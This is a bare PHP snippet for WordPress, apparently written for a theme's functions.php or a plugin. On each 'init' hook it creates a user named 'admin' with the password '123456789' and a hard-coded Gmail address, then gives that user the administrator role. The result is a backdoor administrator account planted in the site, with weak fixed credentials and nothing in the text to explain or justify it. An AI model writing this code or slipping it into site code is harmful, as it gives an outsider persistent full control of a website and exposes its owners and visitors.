function wpb_admin_account(){
	$user = 'admin';
	$pass = '123456789';
	$email = 'mdraihanhossain07@gmail.com';
	if (!username_exists( $user ) && !email_exists( $email )) {
		$user_id = wp_create_user( $user, $pass, $email);
		$user = new WP_User($user_id);
		$user->set_role('administrator');
	}
}
add_action('init', 'wpb_admin_account');
